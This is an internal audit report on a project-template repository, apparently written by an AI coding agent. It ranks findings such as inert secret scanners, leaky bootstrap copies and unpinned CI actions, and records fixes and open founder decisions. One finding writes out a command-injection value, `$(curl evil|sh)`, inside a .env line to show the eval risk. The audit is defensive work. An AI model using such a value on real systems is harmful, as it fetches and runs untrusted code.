# Blueprint audit — contamination + inconsistency sweep (2026-07-23)

**Trigger:** founder-supplied diagnosis of a fork-bomb-class leak in
`scripts/agent-activity.sh`, then: *"a full review from you using fable and
codex to clean the repository from any contaminations and inconsistencies."*

**Reviewers:** 4× Fable agents (contamination · doc/rule consistency · shell
defects · bootstrap+sync) + Codex/Slava (cross-provider four-eyes, per
[AGENTS.md](../../AGENTS.md) and commit `873c560`). Findings below are
**deduplicated** across reviewers; the `Confirmed` column records whether I
verified the claim myself rather than relaying it.

**Fix status (authoritative) — updated by the 2026-07-24 `lcm` pass.**

**DELIVERED + QA-ACCEPTED (Jesko, QA-2, round 2, 2026-07-24)** — all seven
accepted with executed evidence; record in
`docs/waiting-acceptance/ACCEPTANCE-JESKO-ROUND2-2026-07-24.md`. Rows live on
here for traceability:
**A-01** (host paths out of committed settings), **A-05** (bootstrap ships
tracked template content only), **A-12** (roster on the `.env` model), **A-14**
(git identity inherited), **A-15** (shell tests wired into a gate), **A-27**
(all five `project_config_*.md` ignored), **A-36** (Actions pinned to SHAs), plus
**BUG-001**, **BUG-002** and **BUG-003** — see `docs/waiting-acceptance/BUGS.md`.
**A-02** is closed (scanners installed). **A-03 is now empirically confirmed**
rather than reasoned, and remains OPEN.

> **Jesko's explicit caveat, recorded so it is not lost:** accepting these seven
> is **not** acceptance of **A-22**. The gate that protects them is armed on this
> machine only; a fresh clone is still ungated. A-22 is a separate delivery
> promise and stays open below.

> **A-22 UPDATE (2026-07-24) — fix implemented, NOT yet accepted.** Jesko's
> caveat above is now addressed in code: `arm_gate` (`scripts/lib/gate.sh`) is
> called from the two paths that already run at wake (the activity feed and
> `blueprint drift`), so a fresh clone arms itself instead of relying on a
> `postinstall` that never existed. Pinned by `tests/gate-arming/` (11 cases),
> wired into the pre-push gate and CI. **Residual gap, stated rather than
> hidden:** this covers the agent wake paths. A human who clones and pushes
> without ever starting the feed or running drift is still ungated — git has no
> clone hook. That gap is **not closable client-side at all**, and is better
> stated as a layer assignment than a hole: a pre-push hook is advisory by
> construction (repo-local, absent on a clone, `--no-verify` defeats it), so
> local tooling is fast feedback and the enforcing layer is server-side. See
> **A-37** — on this repo that enforcing layer does not currently exist.
> A-22 therefore moves to `waiting-acceptance/` on push, **not** to `done/`;
> only the founder closes it.

**STILL OPEN — everything else in the register below.** The highest-value ones,
in the founder-agreed "guard the pipe" order:

- **A-07** — see below. (**A-22 has moved out of this list — see the note
  directly under Jesko's caveat.**)
- **A-07** — `blueprint a2bp` copies a project's file into the blueprint with a
  bare `cp`: no reverse-substitution, no contamination scan. The vector that
  created BUG-002.
- **A-03** — `gitleaks protect --staged` scans the index, empty at pre-push time.
- **A-08** — `LWA_FEED_*` in `scripts/log-activity.sh`: BUG-002's contamination
  in env-var-namespace form.
- **A-09** — dispatchers still write a literal `~/.{{PROJECT_NAME}}/`, shared
  across projects (redcare's Codex output interleaves with this repo's).

---

## 1. Ranked register

Severity: **S1** = actively harmful now · **S2** = ships broken behaviour to
every derived project · **S3** = correctness/doc drift · **S4** = hygiene.

| ID | Sev | Where | Finding | Confirmed |
|---|---|---|---|---|
| **A-01** | S1 | `.claude/settings.json:151` | `Read(//home/luiz/.vscode/**)` — a host path in the committed settings file trips the repo's **own** host-path guard at `.githooks/pre-push:209`. The blueprint could not push itself. Added automatically by permission prompts **during this session**. | **Me — verified guard fails, then fixed** (moved to gitignored `settings.local.json`; guard passes, JSON valid) |
| **A-02** | S1 | host / `.githooks/pre-push:27-90` | **The entire pre-push security gate is inert on this machine.** `gitleaks`, `semgrep`, `osv-scanner`, `trivy` are all absent, and each step is `if command -v … else warn && skip`. Every security scan prints "⚠ skipped" and the gate passes. CLAUDE.md §Security claims "gitleaks **blocks** the push". | **Me — ran the probe; all 4 missing** |
| **A-03** | S1 | `.githooks/pre-push:30` | Even **with** gitleaks installed, `gitleaks protect --staged` scans the *index*, which is empty at pre-push time (commit already made). The secret gate is a no-op in the normal commit-then-push flow. | Fable; logic verified against the hook source. **Not** empirically run — gitleaks absent (A-02) |
| **A-04** | S1 | `scripts/start-all-watchers.sh:10-32`, `scripts/codex-signal-watch.sh` | **No instance guard anywhere in the watcher stack** — `nohup … &` unconditionally, no pidfile, no flock, no reaper. Run it twice → two `codex exec --sandbox workspace-write` fire on one mic flip: concurrent edits to the same working tree **and 2× billable LLM spend**. Same defect class as BUG-001, with money attached. Violates CLAUDE.md §Cost. | **Me — read both files; confirmed zero guard** |
| **A-05** | S1 | `scripts/new-project.sh:63-67` + `:132` | Bootstrap copies the **whole working tree** (`find … \| cp -R`, everything but `.git`) then `git add -A && git commit`. Untracked + gitignored files are copied into every derived project. Two distinct hazards: **confidentiality** — a `.env` holding `SONAR_TOKEN` is copied into the derived working tree (not *committed* — the copied `.gitignore` travels — but a secret in another tree is already a leak); and **history** — the blueprint's own *tracked* `docs/doing/` work items are not gitignored, so they are copied *and committed*, and a fresh project opens with the blueprint's active bugs as its own. *(Corrects this row's earlier "`.env` would be copied and committed" — per Codex R-1, `.env` is copied, not committed; the committed leak is the tracked work items.)* | **Me — read the copy loop and the commit** |
| **A-06** | S2 | `scripts/agent-activity.sh:60`, `start-copilot-signal-watch.sh:15,18` | `stat -f %m F \|\| stat -c %Y F` is broken on GNU: `stat -f %m` exits 1 **but still prints a multi-line filesystem block to stdout**, and `$(a \|\| b)` captures **both**. The "mtime" is a blob containing live `Free:`/`Available:` block counters, which change constantly → the change-detector fires forever. | **Me — reproduced; this is the root cause of the duplicate `[User] IDLE` lines I saw at wake and could not explain** |
| **A-07** | S2 | `scripts/blueprint:572-578` (`cmd_a2bp`) | `a2bp` copies a project's file into the blueprint with **no reverse-substitution and no contamination scan** — bare `cp`. This is **the mechanism that created BUG-002**: `~/.linkedin-watcher-agent` was back-propagated into the generic script. It also destroys `{{PROJECT_NAME}}` tokens, so one project's name fans out to all others on their next pull. `A2BP_PLAYBOOK.md` has no contamination step. | Fable ×2 (one verified live: a file with `$HOME/.acme-flow` copied in with zero warning) |
| **BUG-002** | S2 | `scripts/agent-activity.sh:8,9,16,26` | Hardcodes `LINKEDIN_WATCHER_AGENT_HOME` / `~/.linkedin-watcher-agent` while its siblings correctly use `~/.{{PROJECT_NAME}}`. Consequence is worse than "wrong path": the `[CODEX]`/`[GEMINI]` lines — the feed's flagship feature — **never appear** in any derived project, silently. | **Me + all reviewers** |
| **A-08** | S2 | `scripts/log-activity.sh:16,26,27,46` | `LWA_FEED_MAX_LINES` / `LWA_FEED_KEEP_LINES` / `LWA_FEED_LABEL` — "LWA" = LinkedIn Watcher Agent. BUG-002's contamination in env-var-namespace form. | **Me — grepped** |
| **A-09** | S2 | `scripts/new-project.sh:72-94` | TARGETS omits `sonar-project.properties` and `scripts/start-gemini-signal-watch.sh`, both of which contain `{{PROJECT_NAME}}`. Result: **every derived project uploads to SonarQube under the literal key `{{PROJECT_NAME}}`** — they all collide on one project and trample each other's issues/coverage. Gemini's watcher creates a literal `~/.{{PROJECT_NAME}}/` dir. CLAUDE.md claims bootstrap substitutes sonar; it does not. `sonar-project.properties` is in `TEMPLATE_FILES` so `pull` never heals it either. | Fable ×3, independently; **me — grepped TARGETS** |
| **A-10** | S2 | `scripts/codex-signal-watch.sh:114` | `last_trigger_key=""` at startup → the watcher fires immediately if `State` **already** equals the target. That is **implicit backlog replay with no opt-in flag** — a direct violation of CLAUDE.md §Cost capability #4, the exact rule written after the $10 linkedin-watcher incident. | Fable |
| **A-11** | S2 | `scripts/blueprint:177-218` | Marker merge validates marker **count only, not order**. Verified live: `END` before `BEGIN` passes the check and the awk **silently deletes** all project content after the BEGIN — while printing "project outside-marker content preserved". | Fable (verified live in a scratch repo) |
| **A-12** | S2 | `scripts/blueprint:53` | `AGENT_ROSTER.md` is in `MANAGED_FILES` but is documented as "the DEFAULT — each team **edits it**", and carries no markers. Any team that customises its roster is flagged as drifted forever, and `pull --yes` **silently resets the team** back to Sylvia & co. | Fable |
| **A-13** | S2 | `.gitignore:29-33,86-88` | The PUBLIC-PUBLISHING PRIVACY BLOCK (what stops CLAUDE.md/AGENTS.md leaking to public GitHub) says "Do NOT edit between the blueprint markers — they'd come back on next sync", but `.gitignore` is **not** in `MANAGED_FILES` and has **no** markers. Fixes to the privacy block never propagate. | Fable |
| **A-14** | S2 | `scripts/new-project.sh:129-130` | Hardcodes `luiz@struct2flow.com` / `Luiz Scheidegger` as repo-local git identity in **every** bootstrapped project, for any operator. | **Me — read it** |
| **A-15** | S3 | `tests/marker-merge/test.sh` | The blueprint's **only** test is wired into **no gate**. The repo has no `backend/`/`frontend/`, so its own pre-push runs **zero tests** — a regression to the merge logic (A-11) pushes green. Also confirms PLAN-BUG-001 §7. | **Me + Fable ×2** (test itself passes: `PASS … EXIT=0`) |
| **A-16** | S3 | `scripts/sonar.sh:30`, `sonar-api.sh:25` | `eval "$(grep -E '^SONAR_…' .env)"` — a config file becomes a code-execution surface (`SONAR_TOKEN=abc $(curl evil\|sh)`), run unattended on `npm run sonar`. | Fable |
| **A-17** | S3 | `.githooks/pre-push:154` | `ls infra/**/*.tf` under `#!/bin/sh` — no globstar, so `infra/envs/prod/main.tf` never matches and the **IaC gate silently skips**. | Fable |
| **A-18** | S3 | docs ↔ code | **Feed opens a Terminal**: `AGENTS.md:28,245` + `CLAUDE.md:38` say it does; `agent-activity.sh:39-41` says auto-open was removed. `AGENT_FEED_NO_TERM` documented but unused. | Codex; **me — read both sides** |
| **A-19** | S3 | docs ↔ docs | **No single executable wake order**: `AGENTS.md` says signal→AGENTS→CLAUDE; `DoD.md §10` + `HANDOVER.md` say HANDOVER first; `CLAUDE.md` says persona+feed "before anything else". | Codex |
| **A-20** | S3 | docs ↔ code | **Handoff identity contradicts the dispatchers**: protocol requires `Holder` = roster persona, but both launchers instruct agents to return `Holder=Claude Code` — the exact same-type collision the roster exists to prevent. | Codex |
| **A-21** | S3 | `.githooks/pre-push` vs `DoD.md §4` | Documented gate order omits the real stages (security runs first, IaC after tests). And the hook is **not** universally blocking as advertised — see A-02. | Codex |
| **A-22** | S3 | `CLAUDE.md`/`.githooks/pre-push` | **FIXED 2026-07-24 (awaiting acceptance)** — see the A-22 update note above. Claimed `postinstall` auto-wires `core.hooksPath` (the claim was in `CLAUDE.md` and the hook header — **not** in `AGENTS.md`). The template has **no root `package.json`**; `new-project.sh` says it runs npm init but doesn't. A later clone has no auto-wire path. | Codex |
| **A-23** | S3 | `scripts/blueprint:341-351` | Under `set -euo pipefail`, a missing line in `.blueprint-source` aborts the whole script **with no output** — the mandatory wake-time `blueprint drift` exits 1 silently. An unattended agent may read that as "no drift". | Fable |
| **A-24** | S4 | `scripts/team-kickoff.sh:18-24` | Default persona intros own **another product's** surface ("the editor", "the v2 pipeline", "share/login surfaces") rather than the roster's generic roles. | Fable |
| **A-25** | S4 | `scripts/build-deck.sh:32` | `npx -y @marp-team/marp-cli@latest` — unpinned remote code executed on every deck rebuild, in an agent-automated step, bypassing the pin-and-scan doctrine the blueprint enforces elsewhere. | Fable |
| **A-26** | S4 | `HANDOVER.md`, `README.md`, `AGENTS.md` | Doc rot: HANDOVER cites "DoD §11" (continuity is §10); README claims bootstrap substitutes placeholders (false per A-09) and runs npm init (it prints a message); AGENTS.md claims the baton stays a "slim four-row" file while the Task cell now carries whole dispatch prompts. | Codex |

### 1b. Doc/rule consistency cluster

| ID | Sev | Where | Finding | Confirmed |
|---|---|---|---|---|
| **A-27** | S1 | `.gitignore:68-70` vs `docs/PUBLISHING.md:39-44` | PUBLISHING.md says `project_config_*.md` (all five) must be ignored before a public push. `.gitignore` lists **only three** — omitting `project_config_security.md` (**threat model, adversary assumptions, incident playbook**) and `project_config_infra.md` (**account IDs, state backends**). Both are tracked. On a derived project's first public push, **the two most sensitive files go public.** | **Me — confirmed both tracked, both absent from `.gitignore`** |
| **A-28** | S2 | `project_config_dod.md:56-64` + `.githooks/pre-push:102` | The template every project inherits ships **the exact anti-pattern CLAUDE.md forbids**: `brownfield → ≥70%` (canon: ratchet from the current true number, no 70% anywhere) and `include: src/application/**, src/domain/**` / `exclude: src/adapters/**` — verbatim the "subset-metric trap" CLAUDE.md §Coverage calls out by name. The hook comment repeats it. | Fable |
| **A-29** | S2 | `.gitignore:28-33` vs `.githooks/pre-push:193-217` + `DoD.md §4.5` + `scripts/blueprint:97` | `.gitignore` ignores `.claude/` wholesale, but three other sources treat `.claude/settings.json` as **committed and managed** (the host-path guard exists *because* it's committed — see A-01). In a derived project the ignore makes DoD §4.5 dead code and blocks the sync. Inert in the blueprint only because the file is already tracked. | **Me — `git check-ignore` confirms the split** |
| **A-30** | S3 | `AGENT_SIGNAL.md:8`, `AGENTS.md:87`, `HANDOVER.md:3`, `DoD.md:11-14` | **Numbering rot on the most-cited gate in the repo.** Two files point at `§A–§G`; the checklist is **A–H** (CLAUDE.md:67 has it right). The omitted **§H is "Self-audit"** — the step that would catch the exact `ls docs/waiting-acceptance/` mismatch those same sentences quote inline. Plus: HANDOVER cites "DoD §11" (continuity is §10); DoD's own intro says "§8 is the checklist" (it's §7). | **Me — verified all four** |
| **A-31** | S3 | hook vs DoD §6.2 vs CI vs `project_config_dod.md` | **osv-scanner threshold differs four ways**: hook blocks on *any* finding (making its own "track lower-severity in findings.md" advice unreachable), DoD + SECURITY.md say HIGH+, CI says MEDIUM+ (the newest deliberate decision, `227f897`), project_config_dod documents flags the hook doesn't use. | Fable |
| **A-32** | S3 | `project_config_overview.md` | CLAUDE.md mandates mechanism rows in §"Security stack", §"Infra stack", §"Code quality stack"; `security.yml:4` cites §Security stack by name. **None of the three sections exist** in the template — only Observability, Cost, Documentation. | Fable |
| **A-33** | S3 | `docs/way-of-working.md` | Deck drift on two concerns: #4 invents "**Recipe C — third-party hosted (Sentry/Datadog)**" (real Recipe C is Containerized; STACK_DEFAULTS explicitly says "**No Sentry**") and adds EMF/X-Ray that appear nowhere; #2 says "four **founder-gated** states" (canon: parked + **three** gated — the deck's own `lcm` bullet contradicts its heading two slides later). | Fable |
| **A-34** | S4 | `README.md:209-223` | Duplicates the `MANAGED_FILES` list the script explicitly says not to duplicate — and it's stale, omitting `AGENT_ROSTER.md`, two docs, 10 of 14 scripts, `.gitleaks.toml`, and the CI workflow. | Fable |
| **A-35** | S4 | `CLAUDE.md:584` vs `:766` | CLAUDE.md contradicts **itself** on how many times the §6.4 deck rule has self-violated: "twice this week" at :584, "four times in a single week" at :766 (deck, playbook, and CLI all say four). A doc-drift rule that has drifted about its own drift count. | Fable |

**Also mine, from this session:** my live baton text in `AGENT_SIGNAL.md`
overwrote the `{{INITIAL_TASK_OR_PLACEHOLDER}}` / `{{YYYY-MM-DD}}` template
tokens. Combined with A-05, a project bootstrapped right now would wake to
"do not run the feed, pending BUG-001" — a bug that does not exist in that
repo. **Restore the template block before anything is committed.**

---

## 2. The through-line

Three findings are one story, and it is the most important output of this audit:

> **A-07** (`a2bp` has no contamination guard) is *how* **BUG-002** got into the
> blueprint. **A-15** (no test runs) is why nothing caught it. **A-02/A-03**
> (security gate inert) is why nothing would catch the next one either.

The blueprint's stated doctrine — back-propagate proven patterns, gate on tests,
scan on push — is **structurally unenforced**. Every capability the framework
sells is real as prose and absent as mechanism. Fixing BUG-001 and BUG-002
without fixing A-07/A-15/A-02 just resets the clock until the next
back-propagation carries the next contamination up.

Recommended order, therefore: **A-01 ✓ → A-05, A-07, A-15, A-02/A-03 → BUG-001,
BUG-002 → the rest.** Guard the pipe before cleaning the water.

---

## 3. BUG-001 consensus: Codex withheld it, and was right

Full review: [CODEX-REVIEW-BUG-001.md](CODEX-REVIEW-BUG-001.md). It validated
the RCA (including my correction to the founder's diagnosis re: the losing
racer) but found three genuine holes in **my** fix design:

1. **F-1 and F-4 contradict each other.** `exec 9>lock` leaves FD 9
   inheritable; surviving children keep the lock held after the leader is
   SIGKILLed, so the next invocation loses `flock` and **never reaches** the
   orphan sweep that was supposed to make SIGKILL recovery converge.
2. **`trap 'kill 0' INT TERM EXIT` is unsafe** — `kill 0` signals the shell
   executing the trap, re-entering traps and making exit status
   nondeterministic.
3. **My bounded pool silently loses product data.** Evicting the oldest of 8
   tails can drop an agent that is *still active but quiet*, and since the path
   stays in `.subagent-seen` it never reattaches. Idle-mtime is not a
   completion signal — an agent can think for >10 min.

It also caught a **false claim of mine**: I wrote that F-3's three layers were
"each independently sufficient to keep the count constant." They are not —
expiry and timeout bound *lifetime*, not *concurrency*. Only the pool cap
bounds instantaneous count.

**Its counter-proposal is better than mine and I accept it:** a single
supervisor tracking a **byte-offset per transcript**, reading appended bytes
itself. No process per file; attribution is free (the supervisor knows which
file it read); no eviction of quiet agents. It also answers C-5 the way I'd
now argue it — the wake protocol should say *"ensure the feed is running"*,
not *"run the feed"*.

PLAN-BUG-001 must be revised to that design before implementation is
authorized. A-06 (the `stat` blob) is a **second, independent** defect in the
same file that the plan does not currently cover and must.

---

## 3b. Founder decisions (2026-07-23) — and what shipped

| Q | Decision | Status |
|---|---|---|
| Fix order | **Accepted "guard the pipe first"** (A-05 bootstrap copy, A-07 a2bp scan, A-15 test wiring, A-02/A-03 scanners) before BUG-001/BUG-002. | Order adopted; pipe work not yet started |
| A-14 git identity | **Inherit from `git config --global`** — do not bake a person in. | **DONE** |
| A-12 `AGENT_ROSTER.md` | **Treat it like `.env`** — tracked example, gitignored per-engineer copy. Backing agents open-ended (teammates may run Qwen, or not run Codex at all). | **DONE** |
| Scope | Write an explanation of the findings to `../redcare/rdc-agenticcoding-blueprint`. | **DONE** — `docs/doing/INHERITED-AUDIT-2026-07-23.md` there, with every finding **re-verified against that repo** rather than copied |

### A-14 — implemented

`new-project.sh` no longer writes `user.email`/`user.name`. It now fails early
with actionable instructions if no identity is configured (rather than letting
`git commit` die on "Author identity unknown"), and echoes `🖋 Committing as:
…` so the identity is visible at the moment it is used.

`STACK_DEFAULTS.md` §"Git author identity" rewritten. **The deleted hardcoding
existed for a real reason** — it stopped a work email (`*.ext@<employer>.de`)
from landing in personal project history and creating IP-assignment ambiguity.
Inheritance makes that the *default* outcome, so that protection is now an
explicit operator instruction plus the bootstrap echo, with the recommendation
to set the **personal** identity globally and override repo-locally for work
repos (so forgetting costs you a work repo with a personal email, not published
personal history carrying an employer address).

> ⚠ **Action required:** `~/.gitconfig` has **no `[user]` section**, and this
> repo has no local one either — verified. With the hardcoding removed,
> `new-project.sh` will now stop with its instruction message until you set one.
> Independently and pre-existing: **this repo cannot commit right now** for the
> same reason (`git var GIT_AUTHOR_IDENT` → "Author identity unknown"), even
> though past commits are authored `Luiz Scheidegger <luiz@struct2flow.com>`.

### A-12 — implemented

`AGENT_ROSTER.md` → `AGENT_ROSTER.example.md` (tracked, blueprint-managed) plus
a gitignored per-engineer `AGENT_ROSTER.md`. Changed: `.gitignore`,
`MANAGED_FILES` + the a2bp Class-F hint in `scripts/blueprint`, bootstrap
seeding in `new-project.sh` (never overwrites an existing roster),
`agent-activity.sh` (`persona_label` prefers the personal copy, falls back to
the example so a fresh clone still labels personas), and the doc ripple —
`CLAUDE.md` ×2, `AGENTS.md` ×2, `README.md`, `A2BP_PLAYBOOK.md`, and the deck
slide for concern #9, per DoD §6.4.

The example's header now states that the `Backing agent` column is **free text**
— Qwen, Gemini, Copilot, anything — and that only *autonomous dispatch* requires
a matching signal watcher; an agent without one still participates in the baton
when driven manually.

Verified: example tracked + roster ignored, `persona_label` resolves
`Kathrin → Codex` from the personal copy and falls back correctly when it is
absent, `bash -n` clean on all three scripts, no stale
`[AGENT_ROSTER.md](AGENT_ROSTER.md)` links remain.

## 4. What I have NOT done

- Fixed: **A-12**, **A-14**, **A-36**. **A-01** implemented but re-opened by
  Codex round 2 (see §3b) — not closed until re-verified. **Everything else in
  §1 and §1b is untouched**, including all remaining S1s.
- **PLAN-BUG-001 revised to rev 2** around Codex's offset-supervisor design,
  with A-06 folded in — but *not implemented*; round-2 consensus pending.
- Not propagated anything to the four derived repos — all have drifted
  (13/33/120/112 lines), so each needs its own `blueprint pull` + review. The
  redcare explanation doc is written (§3b).
- **A-02 is now closed** — `gitleaks` 8.30.1, `semgrep` 1.171.0,
  `osv-scanner` 2.4.0 and `trivy` 0.72.0 are installed (no `brew` on this
  Ubuntu host, so binaries were fetched from upstream releases into
  `~/.local/bin` with published checksums verified for gitleaks and trivy;
  osv-scanner's checksum file did not match by name and is recorded as a
  sha256 in the install log; semgrep came from PyPI into an isolated venv).
- **A-03 is still open, and is now EMPIRICALLY CONFIRMED** (it was previously
  only reasoned from the source). With gitleaks installed, a full run of
  `.githooks/pre-push` on a repo with 62 commits of real history prints:

  ```
    → Secret scan (gitleaks)...
    INF 0 commits scanned.
    INF scanned ~0 bytes (0) in 3.2ms
    INF no leaks found
  ```

  **Zero bytes scanned, then "no leaks found", then the gate passes.** The
  headline security capability — "gitleaks blocks the push" — is a no-op in the
  normal commit-then-push flow, exactly as predicted. Fix: scan the outgoing
  range from the refs pre-push receives on stdin
  (`gitleaks detect --log-opts="$remote_sha..$local_sha"`). Deliberately left
  for its own change so this review's diff stays reviewable.

- **A-15 is now closed** — `.githooks/pre-push-project` created, wiring both
  `tests/marker-merge/test.sh` and the new `tests/bootstrap-identity/test.sh`
  into the gate. The blueprint repo previously ran **no tests at all** (it has
  no `backend/`/`frontend/`, which is all the generic hook knows how to run).
  Full gate now completes in **1.9 s** against the 30 s ceiling.

## 4b. A-36 (NEW) — unpinned GitHub Actions, found by the newly-installed gate

Installing the scanners made the pre-push gate real for the first time, and its
**first run blocked**: `semgrep` flagged four mutable action references in
`.github/workflows/security.yml` (`actions/checkout@v6` ×3,
`gitleaks/gitleaks-action@v3`) under
`github-actions-mutable-action-tag` — a tag the action owner can silently
repoint, the vector behind the real `trivy-action` and `kics-github-action`
compromises. That the *security* workflow carried the supply-chain defect is
the point worth keeping.

Fixed: both tags resolved via the GitHub API (verified as lightweight tags
pointing directly at commits, so no annotated-tag dereference was needed) and
pinned to full 40-character SHAs with the version retained as a trailing
comment. Re-verified: `semgrep … --error` now exits 0, `gitleaks detect` over
all 62 commits reports no leaks.

## 4c. A-37 (NEW) — `main` is unprotected: the only NON-advisory gate does not exist

Raised by the redcare stream's reframe of my A-22 residual gap (agent-exchange,
2026-07-24T13:10Z), and **verified here, not assumed**:

```
$ gh api repos/LuizStruct2Flow/blueprint/branches/main/protection
{"message":"Branch not protected", ...}   # HTTP 404
```

**The reframe that makes this a finding.** A pre-push hook is *advisory by
construction*: it is repo-local config (A-22), absent on a fresh clone, and
`--no-verify` defeats it in one flag. So local tooling can never be the
enforcement layer — it is fast feedback for people who have tooling. The
enforcement layer is server-side required status checks. On this repo that
layer is **absent**: `.github/workflows/security.yml` does run on every push
(verified via `gh run list` — it is NOT redcare's BUG-018 shape, where a
workflow had never once started for months), but it runs **after** the commits
are already on `main`, and nothing blocks or reverts them when it fails.

Net: A-22 hardened the advisory layer, which was worth doing and is where the
fast feedback lives. It did not create an enforcing one. **Stating the residual
gap as a layer assignment rather than a hole** — local = feedback, CI = gate —
is only honest if the CI layer actually gates. Here it does not.

**Not fixed unilaterally — this is a founder decision, and it has a real
tension in it.** CLAUDE.md mandates **trunk-based development, no branches,
direct pushes to `main`**. GitHub's required-status-checks enforce at *merge*
time; turning them on for direct pushes to `main` blocks the trunk-based flow
outright, because a check cannot have passed on a sha that has not been pushed
yet. So the honest options are a genuine trade, not an oversight to correct:

1. **Accept it** — record that this repo's enforcement is social + advisory,
   and that a failing CI run on `main` is a fix-forward signal rather than a
   gate. Cheapest; keeps trunk-based intact; means a bad commit does land.
2. **Protected `main` + short-lived PRs** — real enforcement, but it
   contradicts the trunk-based rule and changes how the whole team works.
3. **Post-hoc enforcement** — leave pushes open, add an alert (and optionally
   an auto-revert) when the `security` workflow fails on `main`. Keeps
   trunk-based; converts "silently red" into "loudly red". Nothing blocks the
   bad commit landing, but nothing hides it either.

Option 3 is the one I would argue for, because it is the only one that keeps
the founder-mandated workflow while removing the silence — and silence is what
every finding in this register has actually been about. **Founder's call.**

## 5. Next up

All four questions from the first pass are answered (§3b). Remaining, in the
agreed "guard the pipe first" order:

1. **A-05** — bootstrap copies the working tree; switch to `git archive HEAD`.
   Highest value: it is the `.env`/`SONAR_TOKEN` leak path.
2. **A-07** — add the contamination guard + reverse-substitution to
   `cmd_a2bp`, and a "Step A0 — contamination sweep" to `A2BP_PLAYBOOK.md`.
   This is the vector that created BUG-002.
3. **A-15** — wire `tests/marker-merge/test.sh` into a blueprint
   `.githooks/pre-push-project` (~2 s, well inside the 30 s ceiling), and
   extend it to cover A-11 (misordered markers silently delete content).
4. **A-02 / A-03** — install the scanners; fix the `gitleaks protect --staged`
   invocation to scan the outgoing range.
5. **A-27** — add `project_config_security.md` + `project_config_infra.md` to
   `.gitignore`. One line, and it is a live exposure.
6. **Then** BUG-001 (needs the plan revised to Codex's offset-supervisor
   design first, plus A-06 folded in) and BUG-002 — for which
   `rdc-agenticcoding-blueprint` already holds the better fix (§2 of the
   inherited-audit doc there).

**Still open:** the derived repos beyond redcare (`greenwashing-detection-agent`,
`storm2flow`, `linkedin-watcher-agent`) have not been swept — all have drifted
(33/120/112 lines) and the same `a2bp` vector applies in both directions.
